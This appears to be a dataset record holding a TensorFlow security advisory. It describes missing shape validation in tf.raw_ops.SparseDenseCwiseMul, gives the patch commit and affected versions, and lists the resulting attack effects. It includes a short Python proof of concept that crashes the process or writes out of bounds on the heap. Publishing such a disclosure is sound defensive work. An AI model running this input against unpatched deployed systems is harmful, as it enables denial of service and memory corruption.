{"description": "### Impact\nDue to lack of validation in `tf.raw_ops.SparseDenseCwiseMul`, an attacker can trigger denial of service via `CHECK`-fails or accesses to outside the bounds of heap allocated data:\n\n```python\nimport tensorflow as tf\n\nindices = tf.constant([], shape=[10, 0], dtype=tf.int64)\nvalues = tf.constant([], shape=[0], dtype=tf.int64)\nshape = tf.constant([0, 0], shape=[2], dtype=tf.int64)\ndense = tf.constant([], shape=[0], dtype=tf.int64)\n  \ntf.raw_ops.SparseDenseCwiseMul(\n    sp_indices=indices, sp_values=values, sp_shape=shape, dense=dense)\n```\n\nSince the [implementation](https://github.com/tensorflow/tensorflow/blob/38178a2f7a681a7835bb0912702a134bfe3b4d84/tensorflow/core/kernels/sparse_dense_binary_op_shared.cc#L68-L80) only validates the rank of the input arguments but no [constraints between dimensions](https://www.tensorflow.org/api_docs/python/tf/raw_ops/SparseDenseCwiseMul), an attacker can abuse them to trigger internal `CHECK` assertions (and cause program termination, denial of service) or to write to memory outside of bounds of heap allocated tensor buffers.\n\n### Patches\nWe have patched the issue in GitHub commit [7ae2af34087fb4b5c8915279efd03da3b81028bc](https://github.com/tensorflow/tensorflow/commit/7ae2af34087fb4b5c8915279efd03da3b81028bc).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.", "methods": ["Triggered denial of service via CHECK-fails.", "Triggered denial of service via accesses to outside the bounds of heap allocated data.", "Wrote to memory outside of bounds of heap allocated tensor buffers."]}
